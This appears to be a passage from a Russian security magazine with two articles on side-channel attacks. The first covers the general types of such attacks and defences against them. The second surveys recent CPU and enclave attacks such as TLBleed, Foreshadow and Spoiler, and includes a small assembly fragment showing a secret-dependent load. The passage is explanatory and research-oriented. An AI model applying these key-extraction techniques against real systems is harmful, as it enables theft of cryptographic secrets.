ИТОГИ
Первая конференция Oﬀzone в 2018 году была сделана на драйве и сразу
заявила о себе как о комьюнити‐пло щадке с яркими активностями и силь‐
ными докладами. Мероприятие это го года показало, что запал никуда
не исчез. Oﬀzone растет и развивается, пробует новые форматы, сохраняя
верность своей главной концепции: «никаких пиджаков, никакого бизнеса —
только hardcore research».
COVERSTORY
ОБХОДНЫЕ
ПУТИ





   КАК АТАКИ ПО СТОРОННИМ КАНАЛАМ
  ПОЗВОЛЯЮТ ВЫКРАДЫВАТЬ ДАННЫЕ
     И ОБХОДИТЬ ШИФРОВАНИЕ





Все  техники  взлома  крип тографических
систем разделяют на две боль шие группы:
использующие недостатки самих алго рит‐
мов шифрования и их физических реали‐
заций. В этой статье мы рассмотрим пос‐        Андрей Васильков                                                                                         редактор, фронемофил, гик,
ледние, которые называ ют SCA (side‐chan‐          angstroem@hotbox.ruк. м. н. и т. п.
nel attacks) — атаки по сторонним (или
побочным) каналам.


           WARNING

                        Статья написана в исследовательских целях. Вся
                    информация в ней носит ознакомительный харак‐
                          тер. Ни автор, ни редак ция не несут ответствен‐
                       ности за любой возможный вред.



ЧТО ТАКОЕ SCA
В отличие от абстрактной матема тичес кой модели, любая физическая реали‐
зация шифрсистемы не может быть полностью изолирована. Она всегда сос‐
тоит из каких‐то серийно выпускаемых компонентов, имеющих свои особен‐
ности работы. Например, криптомодуль неодинаково потребляет электро‐
энергию во время разных битовых операций, создает характерные радиочас‐
тотные помехи, испытывает отличающиеся в зависимости от входных данных
задержки, сильнее нагрева ется в одном случае и слабее в другом. Все это —
косвенные данные, которые позволяют  узнать секретную информацию,
не имея к ней прямого дос тупа.
  На практике SCA в различных вариантах исполь зуются очень широко —
от подслушивания паролей до считыва ния защищенных областей памяти
в обход изоляции адресного пространс тва, причем необязательно на локаль‐
ной машине.
   Суть SCA состоит в том, чтобы вместо лобовой атаки перехватить какие‐то
побочные сигналы, возникающие при обра ботке изолированных или зашиф‐
рованных данных. Затем по этим сигналам пытаются восстановить секретную
информацию (пароль, хеш, ключ шифрования, текст сообщения) без прямого
обращения к защищен ным данным.


Зву ковые колебания
Простейший пример: ты хочешь узнать пароль сво его коллеги, но не можешь
подсмотреть его во время набора. При этом на слух удается определить его
длину и однократное использование пробела — эта клавиша зву чит очень
своеобразно. Безо всякого обо рудования и хитрых программ ты уже узнал
многое о пароле, просто навострив уши.
   Если же сде лать несколько аудиозаписей того, как логинится коллега,
а затем применить статистичес кий анализ, то ты смог бы восстановить весь
пароль или его большую часть. Единичные неуверенно рас познанные сим‐
волы все рав но подбираются по мас ке за корот кое время.
   Такой же по сути (но более сложный в плане реализации) метод атаки
по сторонним каналам использовало британское агентство GCHQ в середи‐
не шестидесятых. Оно установило микрофоны в египетском посольстве
и записывало звуки, которые издает механи чес кая шиф ровальная машина.
По ним выяснили начальные положения двух символьных дисков, а дальше
вскрыли схему шифрования обычным перебором.
  Сегодня SCA редко выполняются по акустическому каналу — разве что
это делается в качестве академического исследова ния. Например, извес‐
тный криптограф Ади Шамир задался целью вос ста новить ключ RSA по дик‐
тофонной записи звуковых пат тернов шифрования. (Да, электроника тоже
по‐разному скрипит, ког да выполняет типовые операции.) Ему в итоге уда‐
лось это сделать, правда в совершенно нетипичных условиях: компьютер неп‐
рерывно шифровал одним и тем же ключом в течение часа, все остальные
процессы были выгружены.


Элек тро магнитное излу чение
Куда чаще на практике измеряют электро магнитное излучение (ЭМИ). Оно
тоже меняется в зависимости от того, какой скан‐код отправляется компь‐
ютеру с клавиатуры и какие инс трукции выполняют разные чипы. По‐русски
это называется регистра ция ПЭМИН (побочных электромагнитных излучений
и наводок), а в англо язычной литературе — TEMPEST (Transient Electromag‐
netic Pulse Emanation Standard).
  Аббре виатура TEMPEST была взята из одно именной секретной прог‐
раммы США семидесятых годов. К нас тояще му времени на ее основе был
разработан целый набор стандартов, где описаны тре бования для защиты
оборудования разного класса от демас киру ющих ЭМ‐излучений. В нулевых
годах термин TEMPEST ста ли использовать для обозначения любой атаки,
основанной на регистрации побочного ЭМИ.
  В современном варианте для анализа ПЭМИН чаще всего используются
программируемые радиосистемы (SDR). Например, в работе Stealing Keys
from PCs using a Radio авторы показывают, как с помощью ресиве ра FUNcube
Dongle Pro+ можно вскрыть RSA‐ключи, находясь в полуметре от обрабаты‐
вающего их ноутбука.
  Еще одна любопытная модификация этой ата ки — непрерывное изме‐
рение электрического потенциала на корпусе ноутбука во время шифрования
или дешифрования. Сопос тавив гра фик с известным шифртекстом и алгорит‐
мом, можно вычислить ключ даже очень большой длины.


ВИДЫ АТАК ПО СТОРОННИМ КАНАЛАМ
Если получить физический доступ к оборудованию, то векторов для атаки
по сторонним каналам становится больше. Можно измерять задержки выпол‐
нения разных операций (timing attack), пики потребле ния энергии в начале
раундов шифрования  (power-monitoring attack), манипулировать вход‐
ными данными и изучать сообщения об ошиб ках (fault attacks). Вот общая
схема.





        Смешанная классифика ция атак по сто ронним каналам

Разделение это очень условное. Например, под «уда ленными» здесь понима‐
ют как сетевые атаки (см. ата ка по времени на OpenSSL, PDF), так и, скажем,
перехват радиосигналов (про него можешь подробнее пос мотреть в иссле‐
довании A Survey of Electromagnetic Side‐Channel Attacks, PDF).
  В свою очередь, «локальность» может озна чать как простую возможность
подойти к компьюте ру поближе, так и возможность запустить на нем код
с локального носителя или даже подпаять провода к криптографичес кому
модулю.
  С разделением на активные и пассивные атаки все относительно прос то.
Вмешиваешься  в  работу  криптосистемы?  Меняешь  ее  параметры?
Это активные действия. Тихо сидишь с приемни ком и мол ча наб людаешь?
Это пассивный перехват, при котором ты вряд ли спа лишься.
   Чаще все го активные ата ки выполняют для уско рения взлома, но иногда
это просто единственный вариант. Например, чтобы вскрыть криптомодуль
методом «черного ящика», нужно отправлять ему на вход разные (заведомо
известные) сообщения и накапливать выходные данные для последующе го
статистического анализа (раз нос тный метод).


Считывание остаточ ной информации
Это одна из самых популярных техник. Она вклю чает в себя вос становление
недавно удаленных файлов, универсальную атаку методом холодной перезаг‐
рузки (cold boot attack) и более специфичес кие при емы — например, из вле‐
чение ключа BitLocker из дампа оперативной памяти.
  При работе программы оставляют множество следов на диске (времен‐
ные файлы, логи) и в оперативке (которая вир туализируется и периодичес ки
свопится на тот же диск), поэтому всегда стоит начинать с поиска остаточной
информации. Боль шинство методик требуют наличия физического доступа,
но возможны и удаленные атаки, например скачивание бэкапов по сети
или считывание кеша сетевого МФУ в поис ках прошедших через него
документов.


Анализ ошибок вычислений
Самая длительная про цедура. Использует ся в том случае, если у тебя нет
более простых возможностей. На уровне аппа рат ного шифрования возникно‐
вение ошибки в расчетах можно спровоцировать изме нением тактовой час‐
тоты или напряжения питания крип тогра фического модуля. Эти манипу ляции
сильно упростили появление дос тупной плат формы ChipWhisperer для ана‐
лиза устойчивости к SCA хардверных компонентов.
  В обычных компьютерах шифрование программное, поэтому там при‐
ходится действовать ина че. Ты раз за разом подменя ешь часть зашифрован‐
ных данных  (например, перезаписывая  стра ницы  памяти) и смотришь
на ошибки, возникающие при их дальнейшей обработке. Так или иначе,
в ходе атаки ты постепенно накапливаешь статистику для дифференциаль‐
ного анализа в надежде, что найдешь какую‐то закономерность между вход‐
ными и выходными параметрами меж ду извес тным тебе открытым текстом
и зашифрованным.
   Из‐за типичных недочетов прикладных программ и драйверов этот про‐
цесс может быть на удивление результативным. Например, в работе Fault At‐
tacks on Encrypted General Purpose Compute Platforms описано, как можно
взломать секретный ключ RSA в программе GnuPG, анализи руя ошибки сис‐
темы с шифрованием всех данных в оперативной памяти (аналог AMD Secure
Memory Encryption).


Атака по вре мени
Эта атака становится воз можной в том случае, если длительность операций
шифрования зависит от структуры данных. Это спра ведливо для всех крип‐
тосистем, выпол няющих операции сложения над произвольным (неизвес‐
тным заранее) числом битов. Нап ример, для RSA и основанного на нем про‐
токола SSL.
   Хуже того, есть разновидность универ сальных атак по времени. Они
нацелены на кеш процес сора общего наз начения и могут рас крыть информа‐
цию из любого текущего про цес са — включая менеджер паролей, браузер
в песочнице и виртуальный диск с шифрованием на лету. Подробнее см.
статью про Meltdown и Spectre.


(Не)инвазивные атаки
Инвазивностью называют необходимость физических воздействий на ата‐
куемую систему. К примеру, вскрыть корпус USB‐Flash с аппаратным шиф‐
рованием, растворить эпоксидку ацетоном и удалить медную экранирующую
пластину — это инвазивная атака (ее сот рудники Google демонстрировали
на Black Hat 2017, см. слайды их презентации, PDF). Если внутри такой флеш‐
ки нет экранирования, то можно действо вать неинвазивно и сразу выполнить
пассивную TEMPEST‐ата ку. Соот ветс твенно, есть про межу точные «полуинва‐
зивные» методы, при которых не происходит необратимых изме нений конс‐
трукции.
  Самый инвазив ный метод — это зон дирование. В прос тейшем случае
вскрывают криптомодуль и на его ножки или дорожки под соеди няют изме‐
рительное оборудование. В экс тремальном варианте его изучают в букваль‐
ном смысле под мик роскопом. С чипа снимается тонкий слой микротомом,
после чего внутренняя структура микросхемы фотографируется с большим
увеличением. Процедура повторя ется до тех пор, пока не удас тся восста‐
новить принципиальную схему.
  Зондирование  со  «скоблением»  микросхем  и  макросъемкой  было
популярно в восьмидеся тых, когда внутри чипов содержалось сравнительно
мало транзисторов, а их раз меры позволяли разглядеть соединения в опти‐
ческий микроскоп. Сейчас оно используется в основном для сравнительного
анализа отдельных микроконтроллеров и специализированных схем. Изучить
таким образом устрой ство современных процессоров практически невоз‐
можно из‐за жестких технологических норм (14 нм и менее) и обилия элемен‐
тов (миллиарды транзисто ров).


ЗАЛОГ УСПЕХА
В целом не так важно, какой побочный канал выб рать. Главное, чтобы во вре‐
мя считывания данных выполнялись следующие условия:
 • уровень  регистрируемо го  сигнала выше  уровня шумов  (достаточно
   высокое соотношение SNR);
 • между харак теристиками перехваченного сигнала и искомыми данными
   есть корреляция (необязательно очевидная, но выявляемая статис тичес‐
   кими методами);
 • на стороннем канале наб людаются извес тные низкие задержки (регистри‐
   руемая величина меняется почти синхронно с исследуемой);
 • частота регистрации сигнала в побочном канале равна частоте изменения
   секретных данных или превышает ее.

Эти условия нарушаются в неаккурат ных экспериментах, поэтому на хакер‐
ских  конференциях  иногда  встречаются  безосновательные  заявления
про новые типы SCA. Например, по изменению уровня осве щенности в ком‐
нате пытаются воссоздать изображение на мониторе. В эпоху ЭЛТ это было
возможно из‐за строч ной раз вертки, но с появлением ЖК‐панелей (у которых
кадры сме няются целиком) для такой ата ки ста ло недос таточно данных.
Вероятность успеха оказалась пример но такая же, как угадать состояние
FHD‐матрицы по одному пикселю.
  Бывает, что метод явно пытаются использовать за границами его при‐
менимости. К примеру, динамика показателей напряжения и силы тока, сня‐
тых непосредственно с чипа, многое рас скажет о характере его вычис лений.
Так, при помощи CPA (Correlation Power Analysis) в 2014 году удалось взло‐
мать AES во всех режимах шифрования. При этом бесполез но пытаться вос‐
становить секретный ключ по изменению энергопотребления компьютера.
Максимум получится определить, что он включен и выполняет какие‐то ресур‐
соемкие операции.


ЗАЩИТА ОТ SCA
Способы противодействия атакам по сторонним каналам становятся очевид‐
ны из анализа практик взло ма. Вот набор общих рекомендаций:
 • максимальная изоляция. Как администра тор — отключи неис пользуемые
   сетевые интерфейсы, закрой лишние порты. Как пользователь — исполь‐
   зуй экранную клавиату ру для вво да паролей. Как параноик — установи
   на экран поляризующий светофильтр для защиты от подглядывания;
 • контроль физического доступа. Запирай свои внешние носители в сейфе
   или держи при себе. Если у них и есть настоящее шифрование — это не
   повод бросать их на сто ле. Не пускай за компь ютер посторонних в твое
   отсутствие даже под гостевой учет кой. Самый страшный хакер — с отвер‐
   ткой и загрузоч ной флешкой;
 • устранение следов. Используй гарантированное удаление файлов, очис‐
   тку файла подкачки, кеша браузера и каталогов со вре менными файлами.
  Самые конфиденциальные данные обрабаты вай в Live OS, нацеленных
   на приватность;
 • выбор криптосистем с элементами противо действия SCA. Один и тот же
   алгоритм шифрования может иметь прин ципиаль но отличающиеся реали‐
   зации. Так, AES‐CTR менее уязвим к SCA, чем AES‐ECB;
 • создание шумов. Падение SNR ниже кри тичес кого уровня сделает любую
   дистанционную атаку неэффективной. Громкая музыка помешает подслу‐
   шать, микровол новка забьет часть ЭМ‐спектра шумами. Более надежно
   это делают специализированные генера торы помех;
 • общие правила безопас ности. Регулярная смена паролей и ключей шиф‐
   рования сделает бесполез ными сложные схемы их перехвата.

Остальные методы каса ются раз работчиков защищенных устрой ств:
 • рекомендуется экранировать все элек тронные схемы, кроме модулей бес‐
   проводной связи (anti‐TEMPEST);
 • стирать маркировку микросхем и заливать платы эпоксидной смолой (про‐
   тиводействие инвазивным методам);
 • вырав нивать время выполнения операций (anti‐timing);
 • балансировать энергопотребление (anti‐CPA);
 • использовать встроенный (а не внеш ний) тактовый генератор и допол‐
   нительный стабилитрон (anti‐fault);
 • убирать из серийных продуктов отла дочные порты;
 • выбирать алгоритмы с побитовыми операциями над фиксированным чис‐
  лом битов (независимость от входных данных);
 • маскировать данные и чаще менять векторы ини циализации (мешает
   поиску корреляций).


ЗАКЛЮЧЕНИЕ
Помимо криптографичес ких систем, ата ки по сто ронним каналам все чаще
выпол няются в отношении типовых компонентов компьютеров. Например,
недавно была описана SCA на кеш виртуальной памяти со страничной орга‐
низацией и еще одна универсальная ата ка на изо ляцию сегментов памяти
в архитектуре Intel x86.
   Старые протоколы шифрования можно атаковать в лоб, поскольку они
содержат известные уязвимос ти на уровне крип тографических при митивов.
Например, из‐за подверженности коллизиям хеш‐функция SHA‐1 позволяет
достаточно быстро сгенерировать поддельную цифровую подпись или соз‐
дать фейковый сертификат. Аналогичная ситуация сложилась с потоковым
алгоритмом RC4. Он лежит в основе WEP‐авторизации, которая вскрывается
с помощью AirCrack за минуту.
   Это все известные слабос ти ста рых алгоритмов. Для новых пока не при‐
думано эффективных атак, поэтому единственный способ вскрыть их тех‐
ническими методами — искать обходные пути. Обычно конкретная модифи‐
кация атаки удов летворяет сра зу нес кольким критериям, поскольку побочные
каналы дополняют друг друга.


        WWW

                      •Атака измерением элек трического потенциала,
                      PDF
                      •Атака на страничный кеш, PDF
                         •Spectre4ever — мик роархитек турные побочные
                        каналы
COVERSTORY

ВТОРОЙ
РАУНД





               ДЕВЯТЬ НОВЫХ АТАК
               ПО ОБХОДНЫМ
              КАНАЛАМ НА ОСНОВЕ
              УЯЗВИМОСТЕЙ КЕША





Атаки по сторонним каналам, нацелен ные
на центральный процессор и оперативную
память, становятся все  хитроумнее. Мы
выбрали девять новейших техник, которые
позволяют получить данные в обход всех           Антон Карев                                                                                    Эксперт по информационной
механизмов   безопасности.  Пока   что         безопасности.профессиональныхОбласть
это лаборатор ные эксперименты, но рано      интересовразведка, аналитика— технологическаяв сфере
или поздно один из этих зверей может выб‐        ИБ и интеллектискусственный
                                                                                              vedacoder@mail.ru
раться на волю.


             INFO

                   В 2007 году мы уже публиковали схожую под‐
                       борку актуальных на тот момент угроз: «Кеш‐ата‐
                        ки  по  сто ронним  каналам.  Что  произошло
                        в области уте чек на аппаратном уров не за пос‐
                      ледние два года».
                  О наиболее знаменитых атаках на процессоры
                        читай в материале «Meltdown и Spectre. Разбира‐
                    ем фундаментальные уязвимости в процессорах».
                  О теории атак по сторонним каналам и их мно‐
                        гочисленных разновидностях смот ри статью «Об‐
                      ходные пути. Как атаки по сторонним каналам
                       позволяют выкрадывать данные и обходить шиф‐
                      рование».



TLBLEED: ИЗВЛЕЧЕНИЕ КРИПТОКЛЮЧЕЙ
Атака TLBleed эксплуатирует микроархитектурную уязвимость буфера ассо‐
циативной трансляции (TLB), который является неотъемлемой частью боль‐
шинства современных процессоров. Пос ле ряда предварительных вычис‐
лений TLBleed способ на вскрывать цифровые подписи EdDSA и без проблем
извлекать их 256‐битные ключи в 98% случаев. С чуть меньшим успе хом (при‐
мерно 92%) TLBleed справляется с ключами RSA. Атака демонстрирует
положительный результат даже при наличии современных средств защиты
(CAT, TSX и других).
   TLBleed исходит из того, что зло дей имеет возможность выполнять неп‐
ривилегированный код в целевой системе, чтобы отслеживать состояние
разделяемого с жертвой буфера. Но ведь для этого нужно сначала про‐
писаться по соседству с ата куемым процессом — на том же ядре ЦП! Нас‐
колько это реально?





  TLBleed наблюдает за активностью гиперпотока своего «соседа» через
  TLB, даже когда кеши изолированы

В обычной среде выполнения добить ся «совмес тно го проживания» с процес‐
сом жертвы можно довольно‐таки легко: при вязав конкретный процесс
к определенному ядру ЦП. В облачной среде это сделать сложнее, но тоже
возможно, во многом благодаря тому, что облачные провайдеры склонны
активировать в своих ЦП механизм гиперпоточности  (например, EC2).
Это распространенная практика увеличить про изво дительность сис темы —
чтобы разные виртуаль ные машины могли совмес тно использовать одни и те
же ядра ЦП.
   Таким образом, как только преступни ку удается прописаться в том же
ядре, где и жертва, будь то локально или в обла ке, у него сразу появляется
возможность провести ата ку TLBleed.


RET2SPEC: ОШИБОЧНЫЕ СПЕКУЛЯЦИИ
Атака ret2spec по прин ципу действия схожа со Spectre и позволя ет злоумыш‐
ленникам спекулятивно выполнять произвольный код в любом процессе. Она
дает реальную возможность извлекать конфиденциальные данные из чужого
процесса или читать память за предела ми песочницы компилятора JIT, если
приложение выпол няется в контексте браузера.
   Ret2spec пользуется уяз вимостью буфера стека возвратов (RSB) — у сов‐
ременных ЦП клю чевого блока при предсказании адре са возврата. Атака
реализуется в три этапа: сперва провоцируется ошибочное предсказание
в RSB (на рисунке ниже схематично показа но, как этого можно добиться).
Затем спекулятивное выполнение перенап равляется на заранее расстав‐
ленную цепочку инструкций. Пос ле чего остается только наладить канал
обратной связи с обычной средой выполнения, что бы сообщать туда резуль‐
таты спекулятивных вычислений.





     Четыре способа спровоцировать ошибочные предсказания в RSB

Для осуществления последнего этапа ret2spec использует секрето‐зависи‐
мые обращения к памяти, которые модифицируют состояние кеша. Нап‐
ример, если атакующий хочет украсть значение регистра rax из чужого про‐
цесса, он при считывании памяти использует секретное значение в качестве
смещения.


sh1 rax, 12
mov r8, [rbx + rax]

Это приводит к кешированию соответству ющего адреса памяти rbx + rax *
4096, где 4096 — размер стра ницы в байтах. Затем, получив из rbx индекс
кешированной страницы, хакер может узнать зна чение регистра rax. На этом
этапе уже можно воспользоваться известными методами обходных каналов,
такими как Flush + Reload или Prime + Probe.


LAZYFP: ЧИТАЕМ РЕГИСТРЫ FPU И SIMD
Атака LazyFP по своему принципу действия схожа с Meltdown. Основная цель
этой атаки — взлом криптографичес ких систем, опирающихся на инструкции
Intel AES‐NI, которые используются для аппа ратного ускорения алгоритма
шифрования AES.
   LazyFP злоупотребляет «ленивым переключени ем контекста FPU», которое
сегодня практикуется в популярных операционных системах и гипервизорах.
Но, в отличие от Meltdown, LazyFP полага ется на исключение #NM (Device Not
Available), а не #PF (Page Fault). Почему #NM? Потому что именно оно и отве‐
чает за реализацию механизма, оптимизи рующего «ленивое переключение
контекста».
  Спекулятивное выполнение инс трукций позволя ет злодею пол ностью вос‐
станавливать состояние регистров в блоке FPU атакуемого процес са — пос‐
редством непривилегиро ванного локального кода. Чтобы получить достовер‐
ный снимок всего набора FPU‐регистров жертвы (SIMD в том числе), прес‐
тупнику нужен какой‐то способ подавления генерации исключения #NM.
Для этого LazyFP провоцирует другое исключение, которое можно перех‐
ватить и обработать до чтения регистров в FPU.
  На рисунке ниже показан вариант подоб ного экс плоита. Он провоцирует
ошибку страницы — как раз перед выполнением инструкции, затрагивающей
состояние регистров. Для возможности восстановления после такого исклю‐
чения LazyFP предусмотрительно конфигури рует обработчик соответству‐
ющего сигнала.





                     Как подавить генерацию #NM

Здесь инструкция, затрагивающая состояние FPU, выполняется исключитель‐
но спекулятивно. Таким обра зом, прерыва ние, которое она генерирует, фак‐
тически никогда не воз ника ет. Вместо этого атакующий получает сигнал,
который он может обработать без остановки прог раммы. ОС не видит исклю‐
чения #NM и не обновляет FPU‐регистры жер твы содержимым аппаратных
регистров, поэтому они остаются нет ронутыми и их содержимое можно
извлечь. Примерно как при атаке Meltdown.


SGXPECTRE: ВЗГЛЯД ЧЕРЕЗ ПРИЗМУ
Атака SGXpectre позволяет извлекать секреты из анклавов, опять‐таки путем
спекулятивного выполнения. На GitHub для ознакомления вы ложе ны исходни‐
ки кода, реализующего атаку. SGXpectre злоупотребля ет сле дующим занят‐
ным фактом: на прогнозирование ветвления в анклавном коде могут влиять
программы, работающие за его пределами.
  Иначе говоря, внешняя по отношению к анклаву программа может влиять
на внутренний поток управления. А это, в свою очередь, приводит к наблюда‐
емым изменениям состояния кеша в ЦП. Анализируя такие изменения, прес‐
тупник может извлекать секреты, хранящиеся в анклавной памяти или во внут‐
ренних регистрах анклава. На этом и пос троена ата ка SGXpectre.
  Лю бой анклавный код уязвим перед ата кой подобного типа, так как необ‐
ходимые для ее реализации шаб лоны дос тупны в большинс тве рантаймов
SGX, в том числе в Intel SGX SDK, Rust‐SGX и Graphene‐SGX. SGXpectre поз‐
воляет извлекать из анклава seal‐ключи и ключи аттестации. Первые можно
использовать для расшифровки «опечатанного хра нилища» за пределами
анклава, а также для фальсификации данных, которые в нем хранятся. Ключи
второго типа можно применять для аттеста ции злонамеренных анклавов
от имени Intel.
   Атака SGXpectre проводится в нес колько этапов. Сперва злоумышленник
отравляет целевой буфер ветвления. Это необходимо для  того, чтобы
на момент выпол нения инструкции ветвления анклавной программой соот‐
ветствующий адрес появлялся в предска зателе ветвления. В сущности, в этот
момент и просачиваются секреты.
  Следующим шагом нужно подготовить среду центрального процессора
таким образом, чтобы увеличить веро ятность спекулятивного выпол нения
секретной инструкции. Ина че про цес сор обна ружит неправильное предска‐
зание и очистит конвейер (что, в сущности, весь ма логично). Такая подготов‐
ка включает в себя сброс целевого адреса вет вления жертвы и позволяет
задержать завершение инс трукции  вет вления или инс трукции возврата
и истощение RSB — чтобы вынудить ЦП прогнозировать адрес возврата,
используя BTB.
   Теперь требуется задать зна чения регистров, которые атакующий будет
использовать для спекулятивного выполнения инс трукций. С их помощью
можно будет считывать интересу ющие учас тки анклавной памяти: в кеше
будут оставаться следы, которые можно будет мониторить.
  После всех приготовлений оста ется только запустить анклавный код
и проверить кон тролиру емый массив, исполь зуя Flush + Reload, чтобы
извлечь секретные значения.





                        Как работает SGXpectre


FORESHADOW: ТЕНЬ НАД АНКЛАВОМ
Атака Foreshadow извлекает из анклава 128‐битный ключ и все хранимые
в нем секреты, обходя при этом локальную и удаленную аттестации. Причем
все это достигается из непривилегиро ванного режима, без знания внут‐
ренней структуры атакуемой программы. Foreshadow эксплу атирует ту же
микроархитектурную уязвимость спекулятивного выполнения, что и Meltdown.
   Но, в отличие от Meltdown, Foreshadow нацеливается не на традиционные
средства защиты, а на анклавы. При этом учитыва ется тот факт, что изоляция
«таблицы страниц», закрепленных за ядром (одна из современных и дей‐
ственных контрмер против атак по обходным каналам), не рас пространяется
на анклавы!





                       Как работает Foreshadow

Foreshadow извлекает информацию из SGX побай тово, в несколько этапов.
На предварительном эта пе ата ки зло намеренное хост‐приложе ние сначала
выделяет «буфер оракула» — 256 сло тов по 4 Кбайт каждый. Это нужно
для того, чтобы избежать ложных сра батываний из‐за непреднамеренной
активации предвыбор ки строки кеша.
  После этого незашифрованные анклавные данные помещаются в кеш
процессора. На сле дующем шаге считыва ется анклавный секрет и осущест‐
вляется спекулятивное выполнение цепочки инструкций перехода, которые
подгружают запись из секрето‐зависимого буфера оракула в кеш.
  Наконец, на заключительном этапе используется скры тый канал Flush +
Reload и Foreshadow перезагружает сло ты ора кула, чтобы злодей мог узнать
значение секретного байта.


NEMESIS: СТАЗИС СРЕДЫ СОСТОЯНИЯ
Атака Nemesis (PDF) эксплуатирует микроархитектурную уязвимость механиз‐
ма обработки прерываний в ЦП. С помощью тщатель но синхронизированных
IRQ сторонний наблюдатель способен узнать внутреннее состояние анклав‐
ной исполнительной среды. Это акту ально для таких анклавных сис тем, как In‐
tel SGX, Sanctus, TrustLite и другие.
  По большому счету Nemesis зло употребляет тем же аппаратным недос‐
татком, что и Meltdown: генера ция исключений и прерываний откладывается
до тех пор, пока не будет завершено выполнение текущей инс трукции. Ис‐
ходники Nemesis доступны на GitHub, можешь ознакомиться.
   Атака основана на следующем наблюдении: когда запрос на прерывание
поступает в ЦП во время обработки многотактовой инструкции, его исполне‐
ние начинается не сразу, а только после завершения этой инс трукции. Изме‐
ряя задержку (количество тактов меж ду пос туплением IRQ и выполнением
первой инструкции в ISR), зло умышленник может разузнать продолжитель‐
ность  выполнения  инструкции,  обрабатываемой  перед  прерыванием.
Это позволяет понять, какая ветка потока управления там сейчас будет акти‐
вирована.
  На рисунке ниже проиллюстрирован сам процесс атаки на анклавную
исполнительную среду.





После условного перехода jz в анклаве жертвы выполняется либо двухтак‐
тная инструкция inst1, либо трехтактная инс трукция inst2. Что же требуется
сделать злоумышленнику, чтобы определить при ватный поток управления?
  Прежде всего, еще до выполнения анклава, конфигурируется тай мер
с точным подсчетом тактов, чтобы запланировать IRQ на начало первого так‐
та x+1 сразу после инструкции условного перехо да. Затем происходит вход
в анклав и срабатывает таймер, во время выполнения либо inst1, либо in‐
st2.
  После того как выполнение инструкции завершено, анклав сохраняет
и очищает окружение защищен ного режима исполне ния, чтобы передать
управление ненадежному коду (обработчику того самого прерывания). Здесь
уже сравнивается значение метки времени с извес тным моментом пос тупле‐
ния IRQ. Разница в один тактовый цикл подскажет, был выполнен условный
переход в анклаве или нет.


SPOILER: КАТАЛИЗАТОР ДЛЯ ROWHAMMER
Атака Spoiler зло употребля ет микроархитектурной уяз вимостью механизма
спекулятивной загрузки. Этим механизмом оснащены практически все сов‐
ременные процессоры. На GitHub выложены ис ходники Spoiler на С.





              Как выглядит уязвимая спекулятивная загрузка

Широко известные в узких кру гах хакеров атаки Rowhammer и Prime + Probe
традиционно полагаются на предварительный реинжиниринг — чтобы понять,
как происходит преобразова ние виртуальных адресов в физические. Атака
Spoiler позволяет ускорить процесс такого реинжиниринга в 256 раз! Мало
того, с ее помощью можно существенно ускорить Prime + Probe за счет 4096‐
кратного сокращения времени на поиск «вытес няющих наборов» (каждый
из таких наборов представляет собой группу виртуальных адресов, которые
относятся к одной и той же строке кеша).
   Также Spoiler улучшает ата ку Rowhammer. Он приводит к абсолютно детер‐
минированным конфликтам в DRAM: переключа ются строго нужные биты,
со стопроцентной вероятностью. А все благода ря извлечению допол нитель‐
ной информации — 8 бит физичес кого адреса.
   Spoiler можно осуществлять как локально, так и удаленно (из браузерного
JavaScript). Нап ример, здесь показа но, что атаки по обходным каналам
изнутри браузера могут выполнять ся более эффективно и более мобильно
благодаря WebAssembly. На первый взгляд это парадоксальный результат,
ведь, по сути, его исполь зование вводит дополнительный уровень абс трак‐
ций: эмулируется 32‐битная среда, которая переводит внутренние адреса
в виртуальные адреса хост‐процесса (бра узера).
   WebAssembly исполь зует адреса эмулируемой среды, и поэтому у Java‐
Script нет прямого дос тупа к виртуальным адресам. Однако атака Spoiler
в случае реализации на JavaScript дает воз можность проколоть оба уровня
абстракций разом! Пройти сквозь внут ренние адреса, затем виртуальные
адреса и получить информацию непос редственно о физическом адре се.
Это все равно что выйти из Матрицы, только дважды. :)


CACHES: СКАНЕР УЯЗВИМОСТЕЙ
CacheS представляет собой утилиту для ста тического анализа бинарных фай‐
лов и, в частности, поиска уяз вимостей на основе кеша в криптографических
библиотеках. Это могут быть как Prime + Probe, так и Flush + Reload или Prime
+ Abort. Исходники CasheS, как обычно, дос тупны на GitHub.
  Под капотом у CacheS находится напичканная математикой абс трактная
модель, которая упорядо чивает отслежива ние секретных данных и анализи‐
рует взаимозависимости между ними. CacheS была обкатана на популярных
криптографических библиотеках, в том числе Libgcrypt (v. 1.6.3), OpenSSL (v.
1.0.2k and 1.0.2f) и mbedTLS (v. 2.5.1). Ути лита не только успешно подтвер‐
дила свыше 150 уже извес тных уязвимос тей, но и нашла 54 новые, раньше
неизвестные.





                         Как работает CacheS

Получив бинарный файл на входе, CacheS сперва прогоняет его через ути‐
литу реинжиниринга, чтобы восста новить ассемблерный код и структуру
потока управления. Полученные таким обра зом ассемблерные инс трукции
«поднимаются» в платформенно независимое представление.
   Дальше это представление абстра гиру ется до математической модели,
центральной частью которой является концепция SAS (Secret‐Augmented
Symbolic domain), или «домен символичес кого исполнения, дополненный сек‐
ретами». Разработан ная соз дателями утилиты, SAS детально отслеживает
семантику, связанную с секретами программы. В час тности, SAS находит
последовательности ячеек памяти, задей ство ванных при обработке сек‐
ретов.
  Затем выполняется абстрактная интерпретация программы. Итерации
повторяются до тех пор, пока не будет дос тигну та фиксированная точка
в SAS. Завершив анализ очередной функции, CacheS идентифицирует сек‐
рето‐зависимые обращения к памяти и транслирует соответствующие вза‐
имосвязи адресации в SMT‐формулы. После чего CacheS проверяет воз‐
можное наличие обходных каналов и информирует об этом пользователя ути‐
литы.


PYTHIA: ВЗЛОМ ЧЕРЕЗ RDMA
Pythia (PDF) представляет собой набор атак, которые поз воляют, находясь
на одной клиентской машине, узнать, к каким данным обращается жертва
на другой. Это может быть полезно, в частнос ти, при атаке на серверы, обес‐
печивающие работу сервисов вроде Apache Crail (предназначен для хра‐
нения пар ключ — значение). Pythia помогает точно изу чить шаблоны доступа
жертвы: к каким конкретно парам она обращалась.
   Крупные поставщики облачных услуг, такие как Microsoft Azure и Alibaba
Cloud, используют RDMA в своих ЦОД для ускорения обработки и снижения
стоимости доступа к большим объемам данных. При этом зачастую игнориру‐
ются проблемы безопасности, которые сопутс твуют этой технологии.
  Дело в том, что для обес печения пря мого доступа к памяти в обход ЦП
сетевые карты с поддержкой RDMA (далее NRDA) сохраняют в своей встро‐
енной SRAM три вида метаданных, которые регламентируют доступ к локаль‐
ной памяти. Когда SRAM заполняется, сетевые карты свопят метаданные
в основную память через шину PCI‐E. Здесь возникают две проблемы,
которыми может выгодно вос пользоваться ата кующая сторона.
